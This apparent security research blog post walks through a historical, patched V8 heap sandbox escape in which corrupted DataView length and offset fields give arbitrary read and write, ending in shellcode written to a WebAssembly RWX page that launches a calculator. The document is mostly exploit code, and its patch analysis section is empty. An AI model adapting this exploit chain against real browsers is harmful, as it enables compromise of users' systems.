+++
tags = ["browser","v8","chromium"]
categories = ["Web Browsers", "Javascript Engines", "Chromium"]
description = "Corruption of the DataView object's `byte_length` and `byte_offset` fields results in arbitrary read and write primitives external to the heap sandbox."
date = "2023-01-20"
featuredpath = "date"
linktitle = ""
title = "Exploring Historical V8 Heap Sandbox Escapes II"
slug = "exploring-historical-v8-heap-sandbox-escapes-ii"
type = "post"
+++

## Overview

Corruption of the DataView object's `byte_length` and `byte_offset` fields results in arbitrary read and write primitives external to the heap sandbox.

You can find the patch for this heap sandbox escape here: [\[sandbox\] Introduce BoundedSize](https://chromium-review.googlesource.com/c/v8/v8/+/3876823).


## Patch Analysis

...


## Exploit Primitives

```js
const addrof = o => {
  return Sandbox.getAddressOf(o);
};

const weak_read = p => {
  let reader = new Sandbox.MemoryView(p, 64);
  let view = new DataView(reader);
  return view.getBigUint64(0, true); 
};

const weak_write = (p, x) => {
  let writer = new Sandbox.MemoryView(p, 64);
  let view = new DataView(writer);
  view.setBigUint64(0, x, true);
};
```


## DataView Object Overview 

```js
let buf = new ArrayBuffer(128);
let view = new DataView(buf);

%DebugPrint(view);
```


## DataView Byte Offset Corruption

```js
let buf = new ArrayBuffer(128);
let view = new DataView(buf);

%DebugPrint(view);
%SystemBreak();
%DebugPrint(view);
```


## Arbitrary Read Primitive

```js
let heap = (weak_read(0x18) >> 32n) << 32n;
let store = heap + ((weak_read(addrof(buf) + 0x20) & 0xffffffffn) << 8n);
let offset = 0xffffffffffffffffn - store + 1n;

weak_write(addrof(view) + 0x10, offset);              /* view.byte_offset */
weak_write(addrof(view) + 0x18, 0xffffffffffffffffn); /* view.byte_length */
```

```js
const strong_read = p => {
  return view.getBigUint64(Number(p), true);
};
```


## Arbitrary Write Primitive

```js
const strong_write = (p, x) => {
  return view.setBigUint64(Number(p), x, true);
};
```


## Code Execution

```js
let wasm = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x85, 0x80, 0x80, 0x80,
  0x00, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80, 0x00, 0x01,
  0x00, 0x04, 0x84, 0x80, 0x80, 0x80, 0x00, 0x01, 0x70, 0x00, 0x00, 0x05, 0x83,
  0x80, 0x80, 0x80, 0x00, 0x01, 0x00, 0x01, 0x06, 0x81, 0x80, 0x80, 0x80, 0x00,
  0x00, 0x07, 0x91, 0x80, 0x80, 0x80, 0x00, 0x02, 0x06, 0x6d, 0x65, 0x6d, 0x6f,
  0x72, 0x79, 0x02, 0x00, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00, 0x0a, 0x8a,
  0x80, 0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80, 0x00, 0x00, 0x41, 0x2a,
  0x0b
]);
let module = new WebAssembly.Module(wasm);

let instance = new WebAssembly.Instance(module);
let rwx = weak_read(addrof(instance) + 0x60);

let shellcode = [
  0x732f6e69622fb848n,
  0x66525f5450990068n,
  0x15e8525e54632d68n,
  0x4c50534944000000n,
  0x302e303a273d5941n,
  0x00636c6163782027n,
  0x0f583b6a5e545756n,
  0x0000000000000005n
];

for (let i = 0; i < shellcode.length; i++)
  strong_write(rwx + (8n * BigInt(i)), shellcode[i]);

instance.exports.main();
```


## References
 - [\[sandbox\] Introduce BoundedSize](https://chromium-review.googlesource.com/c/v8/v8/+/3876823)
